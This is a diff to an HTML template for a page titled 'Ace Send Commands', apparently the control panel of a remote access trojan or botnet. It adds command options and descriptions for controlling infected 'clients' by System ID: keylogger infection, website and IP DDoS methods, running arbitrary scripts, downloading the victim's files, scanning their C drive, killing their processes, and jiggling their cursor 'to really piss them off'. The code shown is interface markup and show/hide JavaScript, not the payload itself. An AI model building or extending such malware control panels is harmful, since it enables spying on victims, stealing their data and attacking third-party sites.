@@ -4,12 +4,14 @@
     <meta charset="utf-8">
     
     <title>Ace Send Commands</title>
+    <link rel="icon" type="image/x-icon" href="../favicon.ico">
     <link rel="stylesheet" href="../static/css/site.css"/>
     <link rel="stylesheet" href="../static/css/rgb_border.css"/>
     <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
 </head>
 <body>
     <script src="../static/js/site.js"></script>
+
 
 <!-- Top Nav bar -->
 <div class="topnav">
@@ -21,6 +23,7 @@
 </div>
 
 
+<!-- Page Content -->
 <form id="stuff" method="post" name="stuff">
     <br>
     <br>
@@ -36,11 +39,10 @@
                         <input type="text" name="idNumber" id="idNumber" required>
                         <span class="highlight"></span>
                         <span class="bar"></span>
-                        <label>System ID</label>
+                        <label style="text-indent: 5px;">System ID</label>
                     </div> 
                 </div>
 
-                <br>
                 <!-- Command Selection Box -->
                 <div class="centerrr-box">
                     <div class="select_mate" data-mate-select="active" >
@@ -48,17 +50,20 @@
                             <option value="" >Select Command </option>
                             
                             <!-- Options -->
-                            <option value="admincheck">Admin check</option>
-                            <option value="clear">Clear output</option>
+                            <option value="admincheck">Admin Check</option>
+                            <option value="clear">Clear Output</option>
                             <option value="jigglecursor">Jiggle Cursor</option>
                             <option value="jigglecursorstop">Stop Jiggle Cursor</option>
-                            <option value="systeminfo">Grab system information</option>
-                            <option value="stress">Stress bot</option>
-                            <option value="ddos">DDos website</option>
+                            <option value="systeminfo">Grab System Info</option>
+                            <option value="stress">Stress CPU</option>
+                            <option value="ddos">DDos Website</option>
                             <option value="attack">DDos IP</option>
                             <option value="keylogger">Keylogger</option>
                             <option value="runscript">Run Script</option>
                             <option value="download">Download File</option>
+                            <option value="scanfiles">Scan Files</option>
+                            <option value="processcontrol">Process Control</option>
+                            <option value="stopprocessscontrol">Stop Process Control</option>
                         </select>
 
                         <p class="selecionado_opcion"  onclick="open_select(this)" ></p>
@@ -72,6 +77,80 @@
                         <div class="cont_list_select_mate">
                             <ul class="cont_select_int">  </ul> 
                         </div>
+                    </div>
+                </div>
+
+                <!-- Command Descption -->
+                <div class="centerrr-desc">
+                    <!-- Admin Check -->
+                    <div class="desc-box" id="desc-admincheck" style="display: none;">
+                        <h3>Check if client is running payload with admin rights</h3>
+                    </div>
+
+                    <!-- Clear -->
+                    <div class="desc-box" id="desc-clear" style="display: none;">
+                        <h3>Clear command output console</h3>
+                    </div>
+
+                    <!-- Jiggle Cursor -->
+                    <div class="desc-box" id="desc-jiggle-cursor" style="display: none;">
+                        <h3>Jiggle clients cursor to really piss them off</h3>
+                    </div>
+
+                    <!-- Jiggle Cursor Stop -->
+                    <div class="desc-box" id="desc-jiggle-cursor-stop" style="display: none;">
+                        <h3>Stop jiggling clients cursor</h3>
+                    </div>
+
+                    <!-- System Info -->
+                    <div class="desc-box" id="desc-systeminfo" style="display: none;">
+                        <h3>Grab all information about the clients system</h3>
+                    </div>
+
+                    <!-- Stop Process Control -->
+                    <div class="desc-box" id="desc-stopprocesscontrol" style="display: none;">
+                        <h3>Disable process control for client</h3>
+                    </div>
+
+                    
+                    <!-- Process Control -->
+                    <div class="desc-box" id="desc-input-processcontrol" style="display: none;">
+                        <h3>Kill any running processes you have blocked when they are ran</h3>
+                    </div>
+
+                    <!-- Stress -->
+                    <div class="desc-box" id="desc-input-needed-stress" style="display: none;">
+                        <h3>Stress clients CPU to the maxium</h3>
+                    </div>
+
+                    <!-- DDos Website -->
+                    <div class="desc-box" id="desc-input-needed-ddos" style="display: none;">
+                        <h3>Attack site with a wide range of methods<br><br>Methods:<br>• cfb<br>• pxcfb<br>• cfreq<br>• cfsoc</h3>
+                    </div>
+
+                    <!-- DDos IP:PORT -->
+                    <div class="desc-box" id="desc-input-needed-ddos-ip" style="display: none;">
+                        <h3>Attack IP address with a wide range of methods<br><br>Methods:<br>• udp<br>• tcp</h3>
+                    </div>
+
+                    <!-- Keylogger -->
+                    <div class="desc-box" id="desc-input-needed-keylogger" style="display: none;">
+                        <h3>Infect client with a keystroke logger</h3> 
+                    </div>
+
+                    <!-- Run Script -->
+                    <div class="desc-box" id="desc-input-needed-runscript" style="display: none;">
+                        <h3>Write and run any file / script from source</h3> 
+                    </div>
+
+                    <!-- Download File -->
+                    <div class="desc-box" id="desc-input-needed-download" style="display: none;">
+                        <h3>Download any file from client to be viewed</h3> 
+                    </div>
+
+                    <!-- Scan PC Files -->
+                    <div class="desc-box" id="desc-input-needed-scanfiles" style="display: none;">
+                        <h3>Scan C drive for any files named with your input (seperate filenames with a space)</h3> 
                     </div>
                 </div>
 
@@ -233,11 +312,31 @@
                             <label>Path To File</label>
                         </div> 
                     </div>
+
+                    <!-- Scan PC Files -->
+                    <div id="input-needed-scanfiles" style="display: none;">
+                        <div class="commands-input-group"> 
+                            <input type="text" name="scan-files" id="scan-files" novalidate>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Files To Scan</label>
+                        </div> 
+                    </div>
+
+                    <!-- Process Control -->
+                    <div id="input-needed-processcontrol" style="display: none;">
+                        <div class="commands-input-group"> 
+                            <input type="text" name="process-names" id="process-names" novalidate>
+                            <span class="highlight"></span>
+                            <span class="bar"></span>
+                            <label>Processes To Block</label>
+                        </div> 
+                    </div>
                 </div>
 
             </form>
             <br>
-            <div class="centerrr"><button type="submit" id="submit" onclick="check(this.form)" class="custom-btn btn-3"><span>Execute</span></button></div>
+            <div class="centerrr"><button type="submit" id="submit" onclick="check(this.form);" class="custom-btn btn-3"><span>Execute</span></button></div>
         </div>
     </div>
     
@@ -248,7 +347,7 @@
     <!-- Command Output Box -->
     <div id="parent">
         <div class="center-output" class="child">
-            <div class="gradient-border"> <textarea class='scroll' id="output" name="output" rows="30" cols="185" style="background-color:rgb(27, 27, 27);" readonly>{{ commandOutput }} </textarea> </div>
+            <div class="gradient-border"> <textarea class='scroll' id="output" name="output" rows="30" cols="185" style="background-color:rgb(27, 27, 27);padding: 0% 1% 0% 1%;" readonly>{{ commandOutput }} </textarea> </div>
         </div>
     </div>
 <br>
@@ -377,50 +476,116 @@ select_optiones[indx].selected = true;
 <!-- Command Input Script -->
 <script>
 function commandCheck(command) {
+    /* Admin Check */
+    if (command.value == "admincheck") {
+        document.getElementById("desc-admincheck").style.display = "block";
+    } else {
+        document.getElementById("desc-admincheck").style.display = "none";
+    }
+
+    /* Clear */
+    if (command.value == "clear") {
+        document.getElementById("desc-clear").style.display = "block";
+    } else {
+        document.getElementById("desc-clear").style.display = "none";
+    }
+
+    /* Jiggle Cursor */
+    if (command.value == "jigglecursor") {
+        document.getElementById("desc-jiggle-cursor").style.display = "block";
+    } else {
+        document.getElementById("desc-jiggle-cursor").style.display = "none";
+    }
+
+    /* Jiggle Cursor Stop */
+    if (command.value == "jigglecursorstop") {
+        document.getElementById("desc-jiggle-cursor-stop").style.display = "block";
+    } else {
+        document.getElementById("desc-jiggle-cursor-stop").style.display = "none";
+    }
+
+    /* System Info */
+    if (command.value == "systeminfo") {
+        document.getElementById("desc-systeminfo").style.display = "block";
+    } else {
+        document.getElementById("desc-systeminfo").style.display = "none";
+    }
+
+
+    /* Process Control */
+    if (command.value == "processcontrol") {
+        document.getElementById("input-needed-processcontrol").style.display = "block";
+        document.getElementById("desc-input-processcontrol").style.display = "block";
+    } else {
+        document.getElementById("input-needed-processcontrol").style.display = "none";
+        document.getElementById("desc-input-processcontrol").style.display = "none";
+    }
+
+
     /* Stress */
     if (command.value == "stress") {
         document.getElementById("input-needed-stress").style.display = "block";
+        document.getElementById("desc-input-needed-stress").style.display = "block";
     } else {
         document.getElementById("input-needed-stress").style.display = "none";
+        document.getElementById("desc-input-needed-stress").style.display = "none";
     }
 
     /* DDos Website */
     if (command.value == "ddos") {
         document.getElementById("input-needed-ddos").style.display = "block";
+        document.getElementById("desc-input-needed-ddos").style.display = "block";
     } else {
         document.getElementById("input-needed-ddos").style.display = "none";
+        document.getElementById("desc-input-needed-ddos").style.display = "none";
     }
 
     /* DDos IP:PORT */
     if (command.value == "attack") {
         document.getElementById("input-needed-ddos-ip").style.display = "block";
+        document.getElementById("desc-input-needed-ddos-ip").style.display = "block";
     } else {
         document.getElementById("input-needed-ddos-ip").style.display = "none";
+        document.getElementById("desc-input-needed-ddos-ip").style.display = "none";
     }
 
     /* Keylogger */
     if (command.value == "keylogger") {
         document.getElementById("input-needed-keylogger").style.display = "block";
+        document.getElementById("desc-input-needed-keylogger").style.display = "block";
     } else {
         document.getElementById("input-needed-keylogger").style.display = "none";
+        document.getElementById("desc-input-needed-keylogger").style.display = "none";
     }
 
     /* Run Script */
     if (command.value == "runscript") {
         document.getElementById("input-needed-runscript").style.display = "block";
+        document.getElementById("desc-input-needed-runscript").style.display = "block";
     } else {
         document.getElementById("input-needed-runscript").style.display = "none";
+        document.getElementById("desc-input-needed-runscript").style.display = "none";
     }
 
     /* Download File */
     if (command.value == "download") {
         document.getElementById("input-needed-download").style.display = "block";
+        document.getElementById("desc-input-needed-download").style.display = "block";
     } else {
         document.getElementById("input-needed-download").style.display = "none";
+        document.getElementById("desc-input-needed-download").style.display = "none";
+    }
+
+    /* Scan Files */
+    if (command.value == "scanfiles") {
+        document.getElementById("input-needed-scanfiles").style.display = "block";
+        document.getElementById("desc-input-needed-scanfiles").style.display = "block";
+    } else {
+        document.getElementById("input-needed-scanfiles").style.display = "none";
+        document.getElementById("desc-input-needed-scanfiles").style.display = "none";
     }
 }
 </script>
-
 
 
 </body>
